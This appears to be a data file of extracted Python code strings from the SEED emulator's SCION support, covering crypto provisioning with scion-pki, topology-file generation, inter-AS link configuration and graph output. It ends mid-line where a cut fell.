  "def render(self, emulator: Emulator) -> None:\n        \"\"\"!\n        @brief Generate crypto material and sign TRCs.\n        \"\"\"\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n\n        with TemporaryDirectory(prefix=\"seed_scion\") as tempdir:\n            self.__gen_scion_crypto(base_layer, tempdir)\n            for ((scope, type, name), obj) in reg.getAll().items():\n                if type in ['rnode', 'csnode', 'hnode']:\n                    node: Node = obj\n                    asn = node.getAsn()\n                    as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                    isds = self.getAsIsds(asn)\n                    assert len(isds) == 1, f\"AS {asn} must be a member of exactly one ISD\"\n                    self.__provision_crypto(as_, *isds[0], node, tempdir)",
  "def print(self, indent: int = 0) -> str:\n        out = ' ' * indent\n        out += 'ScionIsdLayer:\\n'\n\n        indent += 4\n        for isd, core in self.__isd_core.items():\n            out += ' ' * indent\n            out += f'Core ASes of ISD{isd}: {core}\\n'\n\n        for isd, core in self.__isd_members.items():\n            out += ' ' * indent\n            out += f'Non-Core ASes of ISD{isd}: {core}\\n'\n\n        return out",
  "def __gen_scion_crypto(self, base_layer: ScionBase, tempdir: str):\n        \"\"\"Generate cryptographic material in a temporary directory on the host.\"\"\"\n        topofile = self.__gen_topofile(base_layer, tempdir)\n        self._log(\"Calling scion-pki\")\n        try:\n            result = subprocess.run(\n                [\"scion-pki\", \"testcrypto\", \"-t\", topofile, \"-o\", tempdir, \"--as-validity\", \"30d\"],\n                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True\n            )\n        except FileNotFoundError:\n            assert False, \"scion-pki not found in PATH\"\n\n        for line in result.stdout.split('\\n'):\n            self._log(line)\n        assert result.returncode == 0, \"scion-pki failed\"",
  "def __gen_topofile(self, base_layer: ScionBase, tempdir: str) -> str:\n        \"\"\"Generate a standard SCION .topo file representing the emulated network.\"\"\"\n        path = pjoin(tempdir, \"seed.topo\")\n\n        with open(path, 'w') as f:\n            f.write(\"ASes:\\n\")\n            for asn in base_layer.getAsns():\n                as_: ScionAutonomousSystem = base_layer.getAutonomousSystem(asn)\n                isds = self.getAsIsds(asn)\n                isd, is_core = isds[0]\n                assert len(isds) == 1, f\"AS {asn} must be a member of exactly one ISD\"\n\n                f.write(f'  \"{isd}-{asn}\": ')\n                attributes = [f\"'{attrib}': true\" for attrib in as_.getAsAttributes(isd)]\n                if not is_core:\n                    assert (isd, asn) in self.__cert_issuer, f\"non-core AS{asn} does not have a cert issuer in ISD{isd}\"\n                    issuer = self.__cert_issuer[(isd, asn)]\n                    assert issuer in self.__isd_core[isd] and asn in self.__isd_members[isd]\n                    attributes.append(f\"'cert_issuer': {isd}-{issuer}\")\n\n                f.write(\"{{{}}}\\n\".format(\", \".join(attributes)))\n\n        return path",
  "def __provision_crypto(self, as_: ScionAutonomousSystem, isd: int, is_core: bool, node: Node, tempdir: str):\n        basedir = \"/etc/scion\"\n        asn = as_.getAsn()\n\n        def copyFile(src, dst):\n            # Tempdir will be gone when imports are resolved, therefore we must use setFile\n            with open(src, 'rt', encoding='utf8') as file:\n                content = file.read()\n                # FIXME: The Docker compiler adds an extra newline in generated files\n                # (https://github.com/seed-labs/seed-emulator/issues/125).\n                # SCION does not accept PEM files with an extra newline, so we strip a newline here\n                # that is later added again.\n                if content.endswith('\\n'):\n                    content = content[:-1]\n            node.setFile(dst, content)\n\n        def myImport(name):\n            copyFile(pjoin(tempdir, f\"AS{asn}\", \"crypto\", name), pjoin(basedir, \"crypto\", name))\n\n        if is_core:\n            for kind in [\"sensitive\", \"regular\"]:\n                myImport(pjoin(\"voting\", f\"ISD{isd}-AS{asn}.{kind}.crt\"))\n                myImport(pjoin(\"voting\", f\"{kind}-voting.key\"))\n                myImport(pjoin(\"voting\", f\"{kind}.tmpl\"))\n            for kind in [\"root\", \"ca\"]:\n                myImport(pjoin(\"ca\", f\"ISD{isd}-AS{asn}.{kind}.crt\"))\n                myImport(pjoin(\"ca\", f\"cp-{kind}.key\"))\n                myImport(pjoin(\"ca\", f\"cp-{kind}.tmpl\"))\n        myImport(pjoin(\"as\", f\"ISD{isd}-AS{asn}.pem\"))\n        myImport(pjoin(\"as\", \"cp-as.key\"))\n        myImport(pjoin(\"as\", \"cp-as.tmpl\"))\n\n        #XXX(benthor): trcs need to be known for other isds as well\n        for isd in self.__isd_core.keys():\n            trcname = f\"ISD{isd}-B1-S1.trc\"\n            copyFile(pjoin(tempdir, f\"ISD{isd}\", \"trcs\", trcname), pjoin(basedir, \"certs\", trcname))\n\n        # Master keys are generated only once per AS\n        key0, key1 = as_.getSecretKeys()\n        node.setFile(pjoin(basedir, \"keys\", \"master0.key\"), key0)\n        node.setFile(pjoin(basedir, \"keys\", \"master1.key\"), key1)",
  "def copyFile(src, dst):\n            # Tempdir will be gone when imports are resolved, therefore we must use setFile\n            with open(src, 'rt', encoding='utf8') as file:\n                content = file.read()\n                # FIXME: The Docker compiler adds an extra newline in generated files\n                # (https://github.com/seed-labs/seed-emulator/issues/125).\n                # SCION does not accept PEM files with an extra newline, so we strip a newline here\n                # that is later added again.\n                if content.endswith('\\n'):\n                    content = content[:-1]\n            node.setFile(dst, content)",
  "def myImport(name):\n            copyFile(pjoin(tempdir, f\"AS{asn}\", \"crypto\", name), pjoin(basedir, \"crypto\", name))",
  "class LinkType(Enum):\n    \"\"\"!\n    @brief Type of a SCION link between two ASes.\n    \"\"\"\n\n    ## Core link between core ASes.\n    Core = \"Core\"\n\n    ## Customer-Provider transit link.\n    Transit = \"Transit\"\n\n    ## Non-core AS peering link.\n    Peer = \"Peer\"\n\n    def __str__(self):\n        return f\"{self.name}\"\n\n    def to_topo_format(self) -> str:\n        \"\"\"Return type name as expected in .topo files.\"\"\"\n        if self.value == \"Core\":\n            return \"CORE\"\n        elif self.value == \"Transit\":\n            return \"CHILD\"\n        elif self.value == \"Peer\":\n            return \"PEER\"\n        assert False, \"invalid scion link type\"\n\n    def to_json(self, a_to_b: bool) -> str:\n        if self.value == \"Core\":\n            return \"CORE\"\n        elif self.value == \"Peer\":\n            return \"PEER\"\n        elif self.value == \"Transit\":\n            if a_to_b:\n                return \"CHILD\"\n            else:\n                return \"PARENT\"",
  "class Scion(Layer, Graphable):\n    \"\"\"!\n    @brief This layer manages SCION inter-AS links.\n\n    This layer requires specifying link end points as ISD-ASN pairs as ASNs\n    alone do not uniquely identify a SCION AS (see ScionISD layer).\n    \"\"\"\n\n    __links: Dict[Tuple[IA, IA, LinkType], int]\n    __ix_links: Dict[Tuple[int, IA, IA, LinkType], int]\n\n    def __init__(self):\n        \"\"\"!\n        @brief SCION layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__links = {}\n        self.__ix_links = {}\n        self.addDependency('ScionIsd', False, False)\n\n    def getName(self) -> str:\n        return \"Scion\"\n\n    def addXcLink(self, a: IA|Tuple[int, int], b: IA|Tuple[int, int],\n                  linkType: LinkType, count: int=1) -> 'Scion':\n        \"\"\"!\n        @brief Create a direct cross-connect link between to ASes.\n\n        @param a First AS (ISD and ASN).\n        @param b Second AS (ISD and ASN).\n        @param linkType Link type from a to b.\n        @param count Number of parallel links.\n\n        @throws AssertionError if link already exists or is link to self.\n\n        @returns self\n        \"\"\"\n        a, b = IA(*a), IA(*b)\n        assert a.asn != b.asn, \"Cannot link as{} to itself.\".format(a.asn)\n        assert (a, b, linkType) not in self.__links, (\n            \"Link between as{} and as{} of type {} exists already.\".format(a, b, linkType))\n\n        self.__links[(a, b, linkType)] = count\n\n        return self\n\n    def addIxLink(self, ix: int, a: IA|Tuple[int, int], b: IA|Tuple[int, int],\n                  linkType: LinkType, count: int=1) -> 'Scion':\n        \"\"\"!\n        @brief Create a private link between two ASes at an IX.\n\n        @param ix IXP id.\n        @param a First AS (ISD and ASN).\n        @param b Second AS (ISD and ASN).\n        @param linkType Link type from a to b.\n        @param count Number of parallel links.\n\n        @throws AssertionError if link already exists or is link to self.\n\n        @returns self\n        \"\"\"\n        a, b = IA(*a), IA(*b)\n        assert a.asn != b.asn, \"Cannot link as{} to itself.\".format(a)\n        assert (a, b, linkType) not in self.__links, (\n            \"Link between as{} and as{} of type {} at ix{} exists already.\".format(a, b, linkType, ix))\n\n        self.__ix_links[(ix, a, b, linkType)] = count\n\n        return self\n\n    def configure(self, emulator: Emulator) -> None:\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n\n        self._configure_links(reg, base_layer)\n\n    def render(self, emulator: Emulator) -> None:\n        pass\n\n    def _doCreateGraphs(self, emulator: Emulator) -> None:\n        # core AS: double circle\n        # non-core AS: circle\n        # core link: bold line\n        # transit link: normal line\n        # peering link: dashed line\n\n        self._log('Creating SCION graphs...')\n        graph = self._addGraph('Scion Connections', False)\n\n        reg = emulator.getRegistry()\n        scionIsd_layer: ScionIsd = reg.get('seedemu', 'layer', 'ScionIsd')\n\n        for (a, b, rel), count in self.__links.items():\n            a_shape = 'doublecircle' if scionIsd_layer.isCoreAs(a.isd, a.asn) else 'circle'\n            b_shape = 'doublecircle' if scionIsd_layer.isCoreAs(b.isd, b.asn) else 'circle'\n\n            if not graph.hasVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd)):\n                graph.addVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd), a_shape)\n            if not graph.hasVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd)):\n                graph.addVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd), b_shape)\n\n            if rel == LinkType.Core:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                style= 'bold')\n            if rel == LinkType.Transit:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                alabel='P', blabel='C')\n            if rel == LinkType.Peer:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                style= 'dashed')\n\n        for (ix, a, b, rel), count in self.__ix_links.items():\n            a_shape = 'doublecircle' if scionIsd_layer.isCoreAs(a.isd, a.asn) else 'circle'\n            b_shape = 'doublecircle' if scionIsd_layer.isCoreAs(b.isd, b.asn) else 'circle'\n\n            if not graph.hasVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd)):\n                graph.addVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd), a_shape)\n            if not graph.hasVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd)):\n                graph.addVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd), b_shape)\n\n            if rel == LinkType.Core:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                label='IX{}'.format(ix), style= 'bold')\n            if rel == LinkType.Transit:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                label='IX{}'.format(ix), alabel='P', blabel='C')\n            if rel == LinkType.Peer:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                'IX{}'.format(ix), style= 'dashed')\n\n    def print(self, indent: int = 0) -> str:\n        out = ' ' * indent\n        out += 'ScionLayer:\\n'\n\n        indent += 4\n        for (ix, a, b, rel), count in self.__ix_links.items():\n            out += ' ' * indent\n            out += f'IX{ix}: AS{a} -({rel})-> AS{b}'\n            if count > 1:\n                out += f' ({count} times)'\n            out += '\\n'\n\n        for (a, b, rel), count in self.__links.items():\n            out += ' ' * indent\n            out += f'XC: AS{a} -({rel})-> AS{b}'\n            if count > 1:\n                out += f' ({count} times)'\n            out += '\\n'\n\n        return out\n\n    def _configure_links(self, reg: Registry, base_layer: ScionBase) -> None:\n        \"\"\"Configure SCION links with IFIDs, IPs, ports, etc.\"\"\"\n        # cross-connect links\n        for (a, b, rel), count in self.__links.items():\n            a_reg = ScopedRegistry(str(a.asn), reg)\n            b_reg = ScopedRegistry(str(b.asn), reg)\n            a_as = base_layer.getAutonomousSystem(a.asn)\n            b_as = base_layer.getAutonomousSystem(b.asn)\n\n            try:\n                a_router, b_router = self.__get_xc_routers(a.asn, a_reg, b.asn, b_reg)\n            except AssertionError:\n                assert False, f\"cannot find XC to configure link as{a} --> as{b}\"\n\n            a_ifaddr, a_net = a_router.getCrossConnect(b.asn, b_router.getName())\n            b_ifaddr, b_net = b_router.getCrossConnect(a.asn, a_router.getName())\n            assert a_net == b_net\n            net = reg.get('xc', 'net', a_net)\n            a_addr = str(a_ifaddr.ip)\n            b_addr = str(b_ifaddr.ip)\n\n            for _ in range(count):\n                self._log(f\"add scion XC link: {a_addr} as{a} -({rel})-> {b_addr} as{b}\")\n                self.__create_link(a_router, b_router, a, b, a_as, b_as,\n                                a_addr, b_addr, net, rel)\n\n        # IX links\n        for (ix, a, b, rel), count in self.__ix_links.items():\n            ix_reg = ScopedRegistry('ix', reg)\n            a_reg = ScopedRegistry(str(a.asn), reg)\n            b_reg = ScopedRegistry(str(b.asn), reg)\n            a_as = base_layer.getAutonomousSystem(a.asn)\n            b_as = base_layer.getAutonomousSystem(b.asn)\n\n            ix_net = ix_reg.get('net', f'ix{ix}')\n            a_routers = a_reg.getByType('rnode')\n            b_routers = b_reg.getByType('rnode')\n\n            try:\n                a_ixrouter, a_ixif = self.__get_ix_port(a_routers, ix_net)\n            except AssertionError:\n                assert False, f\"cannot resolve scion peering: as{a} not in ix{ix}\"\n            try:\n                b_ixrouter, b_ixif = self.__get_ix_port(b_routers, ix_net)\n            except AssertionError:\n                assert False, f\"cannot resolve scion peering: as{a} not in ix{ix}\"\n\n            for _ in range(count):\n                self._log(f\"add scion IX link: {a_ixif.getAddress()} AS{a} -({rel})->\"\n                        f\"{b_ixif.getAddress()} AS{b}\")\n                self.__create_link(a_ixrouter, b_ixrouter, a, b, a_as, b_as,\n                                str(a_ixif.getAddress()), str(b_ixif.getAddress()),\n                                ix_net, rel)\n\n    @staticmethod\n    def __get_xc_routers(a: int, a_reg: ScopedRegistry, b: int, b_reg: ScopedRegistry) -> Tuple[Router, Router]:\n        \"\"\"Find routers responsible for a cross-connect link between a and b.\"\"\"\n        for router in a_reg.getByType('rnode'):\n            for peer, asn in router.getCrossConnects().keys():\n                if asn == b and b_reg.has('rnode', peer):\n                    return (router, b_reg.get('rnode', peer))\n        assert False\n\n    @staticmethod\n    def __get_ix_port(routers: ScopedRegistry, ix_net: Network) -> Tuple[Router, Interface]:\n        \"\"\"Find a router in 'routers' that is connected to 'ix_net' and the\n        interface making the connection.\n        \"\"\"\n        for router in routers:\n            for iface in router.getInterfaces():\n                if iface.getNet() == ix_net:\n                    return (router, iface)\n        else:\n            assert False\n\n    def __create_link(self,\n                     a_router: ScionRouter, b_router: ScionRouter,\n                     a_ia: IA, b_ia: IA,\n                     a_as: ScionAutonomousSystem, b_as: ScionAutonomousSystem,\n                     a_addr: str, b_addr: str,\n                     net: Network, rel: LinkType):\n        \"\"\"Create a link between SCION BRs a and b.\"\"\"\n        a_ifid = a_as.getNextIfid()\n        b_ifid = b_as.getNextIfid()\n        a_port = a_router.getNextPort()\n        b_port = b_router.getNextPort()\n\n        a_iface = {\n            \"underlay\": {\n                \"public\": f\"{a_addr}:{a_port}\",\n                \"remote\": f\"{b_addr}:{b_port}\",\n            },\n            \"isd_as\": str(b_ia),\n            \"link_to\": rel.to_json(a_to_b=True),\n            \"mtu\": net.getMtu(),\n        }\n\n        b_iface = {\n            \"underlay\": {\n                \"public\": f\"{b_addr}:{b_port}\",\n                \"remote\": f\"{a_addr}:{a_port}\",\n            },\n            \"isd_as\": str(a_ia),\n            \"link_to\": rel.to_json(a_to_b=False),\n            \"mtu\": net.getMtu(),\n        }\n\n        # XXX(benthor): Remote interface id could probably be added\n        # regardless of LinkType but might then undermine SCION's\n        # discovery mechanism of remote interface ids. This way is\n        # more conservative: Only add 'remote_interface_id' field to\n        # dicts if LinkType is Peer.\n        #\n        # WARNING: As of February 2023, this feature is not yet\n        # supported in upstream SCION.\n        if rel == LinkType.Peer:\n            self._log(\"WARNING: As of February 2023 SCION peering links are not supported in upstream SCION\")\n            a_iface[\"remote_interface_id\"] = b_ifid\n            b_iface[\"remote_interface_id\"] = a_ifid\n\n        # Create interfaces in BRs\n        a_router.addScionInterface(a_ifid, a_iface)\n        b_router.addScionInterface(b_ifid, b_iface)",
  "def __str__(self):\n        return f\"{self.name}\"",
  "def to_topo_format(self) -> str:\n        \"\"\"Return type name as expected in .topo files.\"\"\"\n        if self.value == \"Core\":\n            return \"CORE\"\n        elif self.value == \"Transit\":\n            return \"CHILD\"\n        elif self.value == \"Peer\":\n            return \"PEER\"\n        assert False, \"invalid scion link type\"",
  "def to_json(self, a_to_b: bool) -> str:\n        if self.value == \"Core\":\n            return \"CORE\"\n        elif self.value == \"Peer\":\n            return \"PEER\"\n        elif self.value == \"Transit\":\n            if a_to_b:\n                return \"CHILD\"\n            else:\n                return \"PARENT\"",
  "def __init__(self):\n        \"\"\"!\n        @brief SCION layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__links = {}\n        self.__ix_links = {}\n        self.addDependency('ScionIsd', False, False)",
  "def getName(self) -> str:\n        return \"Scion\"",
  "def addXcLink(self, a: IA|Tuple[int, int], b: IA|Tuple[int, int],\n                  linkType: LinkType, count: int=1) -> 'Scion':\n        \"\"\"!\n        @brief Create a direct cross-connect link between to ASes.\n\n        @param a First AS (ISD and ASN).\n        @param b Second AS (ISD and ASN).\n        @param linkType Link type from a to b.\n        @param count Number of parallel links.\n\n        @throws AssertionError if link already exists or is link to self.\n\n        @returns self\n        \"\"\"\n        a, b = IA(*a), IA(*b)\n        assert a.asn != b.asn, \"Cannot link as{} to itself.\".format(a.asn)\n        assert (a, b, linkType) not in self.__links, (\n            \"Link between as{} and as{} of type {} exists already.\".format(a, b, linkType))\n\n        self.__links[(a, b, linkType)] = count\n\n        return self",
  "def addIxLink(self, ix: int, a: IA|Tuple[int, int], b: IA|Tuple[int, int],\n                  linkType: LinkType, count: int=1) -> 'Scion':\n        \"\"\"!\n        @brief Create a private link between two ASes at an IX.\n\n        @param ix IXP id.\n        @param a First AS (ISD and ASN).\n        @param b Second AS (ISD and ASN).\n        @param linkType Link type from a to b.\n        @param count Number of parallel links.\n\n        @throws AssertionError if link already exists or is link to self.\n\n        @returns self\n        \"\"\"\n        a, b = IA(*a), IA(*b)\n        assert a.asn != b.asn, \"Cannot link as{} to itself.\".format(a)\n        assert (a, b, linkType) not in self.__links, (\n            \"Link between as{} and as{} of type {} at ix{} exists already.\".format(a, b, linkType, ix))\n\n        self.__ix_links[(ix, a, b, linkType)] = count\n\n        return self",
  "def configure(self, emulator: Emulator) -> None:\n        reg = emulator.getRegistry()\n        base_layer: ScionBase = reg.get('seedemu', 'layer', 'Base')\n        assert issubclass(base_layer.__class__, ScionBase)\n\n        self._configure_links(reg, base_layer)",
  "def render(self, emulator: Emulator) -> None:\n        pass",
  "def _doCreateGraphs(self, emulator: Emulator) -> None:\n        # core AS: double circle\n        # non-core AS: circle\n        # core link: bold line\n        # transit link: normal line\n        # peering link: dashed line\n\n        self._log('Creating SCION graphs...')\n        graph = self._addGraph('Scion Connections', False)\n\n        reg = emulator.getRegistry()\n        scionIsd_layer: ScionIsd = reg.get('seedemu', 'layer', 'ScionIsd')\n\n        for (a, b, rel), count in self.__links.items():\n            a_shape = 'doublecircle' if scionIsd_layer.isCoreAs(a.isd, a.asn) else 'circle'\n            b_shape = 'doublecircle' if scionIsd_layer.isCoreAs(b.isd, b.asn) else 'circle'\n\n            if not graph.hasVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd)):\n                graph.addVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd), a_shape)\n            if not graph.hasVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd)):\n                graph.addVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd), b_shape)\n\n            if rel == LinkType.Core:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                style= 'bold')\n            if rel == LinkType.Transit:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                alabel='P', blabel='C')\n            if rel == LinkType.Peer:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                style= 'dashed')\n\n        for (ix, a, b, rel), count in self.__ix_links.items():\n            a_shape = 'doublecircle' if scionIsd_layer.isCoreAs(a.isd, a.asn) else 'circle'\n            b_shape = 'doublecircle' if scionIsd_layer.isCoreAs(b.isd, b.asn) else 'circle'\n\n            if not graph.hasVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd)):\n                graph.addVertex('AS{}'.format(a.asn), 'ISD{}'.format(a.isd), a_shape)\n            if not graph.hasVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd)):\n                graph.addVertex('AS{}'.format(b.asn), 'ISD{}'.format(b.isd), b_shape)\n\n            if rel == LinkType.Core:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                label='IX{}'.format(ix), style= 'bold')\n            if rel == LinkType.Transit:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                label='IX{}'.format(ix), alabel='P', blabel='C')\n            if rel == LinkType.Peer:\n                for _ in range(count):\n                    graph.addEdge('AS{}'.format(a.asn), 'AS{}'.format(b.asn),\n                                'ISD{}'.format(a.isd), 'ISD{}'.format(b.isd),\n                                'IX{}'.format(ix), style= 'dashed')",
  "def print(self, indent: int = 0) -> str:\n        out = ' ' * indent\n        out += 'ScionLayer:\\n'\n\n        indent += 4\n        for (ix, a, b, rel), count in self.__ix_links.items():\n            out += ' ' * indent\n            out += f'IX{ix}: AS{a} -({rel})-> AS{b}'\n            if count > 1:\n                out += f' ({count} times)'\n            out += '\\n'\n\n        for (a, b, rel), count in self.__links.items():\n            out += ' ' * indent\n            out += f'XC: AS{a} -({rel})-> AS{b}'\n            if count > 1:\n                out += f' ({count} times)'\n            out += '\\n'\n\n        return out",
  "def _configure_links(self, reg: Registry, base_layer: ScionBase) -> None:\n        \"\"\"Configure SCION links with IFIDs, IPs, ports, etc.\"\"\"\n        # cross-connect links\n        for (a, b, rel), count in self.__links.items():\n            a_reg = ScopedRegistry(str(a.asn), reg)\n            b_reg = ScopedRegistry(str(b.asn), reg)\n            a_as = base_layer.getAutonomousSystem(a.asn)\n            b_as = base_layer.getAutonomousSystem(b.asn)\n\n            try:\n                a_router, b_router = self.__get_xc_routers(a.asn, a_reg, b.asn, b_reg)\n            except AssertionError:\n                assert False, f\"cannot find XC to configure link as{a} --> as{b}\"\n\n            a_ifaddr, a_net = a_router.getCrossConnect(b.asn, b_router.getName())\n            b_ifaddr, b_net = b_router.getCrossConnect(a.asn, a_router.getName())\n            assert a_net == b_net\n            net = reg.get('xc', 'net', a_net)\n            a_addr = str(a_ifaddr.ip)\n            b_addr = str(b_ifaddr.ip)\n\n            for _ in range(count):\n                self._log(f\"add scion XC link: {a_addr} as{a} -({rel})-> {b_addr} as{b}\")\n                self.__create_link(a_router, b_router, a, b, a_as, b_as,\n                                a_addr, b_addr, net, rel)\n\n        # IX links\n        for (ix, a, b, rel), count in self.__ix_links.items():\n            ix_reg = ScopedRegistry('ix', reg)\n            a_reg = ScopedRegistry(str(a.asn), reg)\n            b_reg = ScopedRegistry(str(b.asn), reg)\n            a_as = base_layer.getAutonomousSystem(a.asn)\n            b_as = base_layer.getAutonomousSystem(b.asn)\n\n            ix_net = ix_reg.get('net', f'ix{ix}')\n            a_routers = a_reg.getByType('rnode')\n            b_routers = b_reg.getByType('rnode')\n\n            try:\n                a_ixrouter, a_ixif = self.__get_ix_port(a_routers, ix_net)\n            except AssertionError:\n                assert False, f\"cannot resolve scion peering: as{a} not in ix{ix}\"\n            try:\n                b_ixrouter, b_ixif = self.__get_ix_port(b_routers, ix_net)\n            except AssertionError:\n                assert False, f\"cannot resolve scion peering: as{a} not in ix{ix}\"\n\n            for _ in range(count):\n                self._log(f\"add scion IX link: {a_ixif.getAddress()} AS{a} -({rel})->\"\n                        f\"{b_ixif.getAddress()} AS{b}\")\n                self.__create_link(a_ixrouter, b_ixrouter, a, b, a_as, b_as,\n                                str(a_ixif.getAddress()), str(b_ixif.getAddress()),\n                                ix_net, rel)",
  "def __get_xc_routers(a: int, a_reg: ScopedRegistry, b: int, b_reg: ScopedRegistry) -> Tuple[Router, Router]:\n        \"\"\"Find routers responsible for a cross-connect link between a and b.\"\"\"\n        for router in a_reg.getByType('rnode'):\n            for peer, asn in router.getCrossConnects().keys():\n                if asn == b and b_reg.has('rnode', peer):\n                    return (router, b_reg.get('rnode', peer))\n        assert False",
  "def __get_ix_port(routers: ScopedRegistry, ix_net: Network) -> Tuple[Router, Interface]:\n        \"\"\"Find a router in 'routers' that is connected to 'ix_net' and the\n        interface making the connection.\n        \"\"\"\n        for router in routers:\n            for iface in router.getInterfaces():\n                if iface.getNet() == ix_net:\n                    return (router, iface)\n        else:\n            assert False",
  "def __create_link(self,\n                     a_router: ScionRouter, b_router: ScionRouter,\n                     a_ia: IA, b_ia: IA,\n                     a_as: ScionAutonomousSystem, b_as: ScionAutonomousSystem,\n                     a_addr: str, b_addr: str,\n                     net: Network, rel: LinkType):\n        \"\"\"Create a link between SCION BRs a and b.\"\"\"\n        a_ifid = a_as.getNextIfid()\n        b_ifid = b_as.getNextIfid()\n        a_port = a_router.getNextPort()\n        b_port = b_router.getNextPort()\n\n        a_iface = {\n            \"underlay\": {\n                \"public\": f\"{a_addr}:{a_port}\",\n                \"remote\": f\"{b_addr}:{b_port}\",\n            },\n            \"isd_as\": str(b_ia),\n            \"link_to\": rel.to_json(a_to_b=True),\n            \"mtu\": net.getMtu(),\n        }\n\n        b_iface = {\n            \"underlay\": {\n                \"public\": f\"{b_addr}:{b_port}\",\n                \"remote\": f\"{a_addr}:{a_port}\",\n            },\n            \"isd_as\": str(a_ia),\n            \"link_to\": rel.to_json(a_to_b=False),\n            \"mtu\": net.getMtu(),\n        }\n\n        # XXX(benthor): Remote interface id could probably be added\n        # regardless of LinkType but might then undermine SCION's\n        # discovery mechanism of remote interface ids. This way is\n        # more conservative: Only add 'remote_interface_id' field to\n        # dicts if LinkType is Peer.\n        #\n        # WARNING: As of February 2023, this feature is not yet\n        # supported in upstream SCION.\n        if rel == LinkType.Peer:\n            self._log(\"WARNING: As of February 2023 SCION peering links are not supported in upstream SCION\")\n            a_iface[\"remote_interface_id\"] = b_ifid\n            b_iface[\"remote_interface_id\"] = a_ifid\n\n        # Create interfaces in BRs\n        a_router.addScionInterface(a_ifid, a_iface)\n        b_router.addScionInterface(b_ifid, b_iface)",
  "class ScionBase(Base):\n    \"\"\"!\n    @brief Base layer for SCION.\n    \"\"\"\n\n    __isds: Dict[int, IsolationDomain]\n\n    def __init__(self):\n        super().__init__()\n        self.__isds = {}\n\n    def configure(self, emulator: Emulator) -> None:\n        super().configure(emulator)\n\n    def render(self, emulator: Emulator) -> None:\n        super().render(emulator)\n\n    def createAutonomousSystem(self, asn: int) -> ScionAutonomousSystem:\n        \"\"\"!\n        @copydoc Base.createAutonomousSystem()\n        \"\"\"\n        as_ = ScionAutonomousSystem(asn)\n        super().setAutonomousSystem(as_)\n        return as_\n\n    def setAutonomousSystem(self, asObject: ScionAutonomousSystem):\n        \"\"\"!\n        @copydoc Base.setAutonomousSystem()\n        \"\"\"\n        assert issubclass(asObject.__class__, ScionAutonomousSystem), \"AS must be derived from ScionAutonomousSystem\"\n        super().setAutonomousSystem(asObject)\n\n    def createIsolationDomain(self, isd: int, label: Optional[str] = None) -> IsolationDomain:\n        \"\"\"!\n        @brief Create a new insolation domain.\n\n        @param isd ISD ID.\n        @param label Descriptive name for the ISD.\n        @throws AssertionError if ISD already exists.\n        @returns Created isolation domain.\n        \"\"\"\n        assert isd not in self.__isds\n        self.__isds[isd] = IsolationDomain(isd, label)\n        return self.__isds[isd]\n\n    def getIsolationDomains(self, isd: int) -> IsolationDomain:\n        \"\"\"!\n        @brief Retrieve an IsolationDomain.\n        @param isd ID os the isolation domain.\n        @throws AssertionError if isd does not exist.\n        @returns IsolationDomain.\n        \"\"\"\n        assert isd in self.__isds, \"isd{} does not exist.\".format(isd)\n        return self.__isds[isd]\n\n    def getIsolationDomains(self) -> List[int]:\n        \"\"\"!\n        @brief Get a list of all ISD IDs.\n\n        @returns List of ISD IDs.\n        \"\"\"\n        return list(self.__isds.keys())\n    \n    def _doCreateGraphs(self, emulator: Emulator):\n        super()._doCreateGraphs(emulator)\n\n    def print(self, indent: int) -> str:\n        out = super().print(indent)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'IsolationDomains:\\n'\n        for isd in self.__isds.values():\n            out += 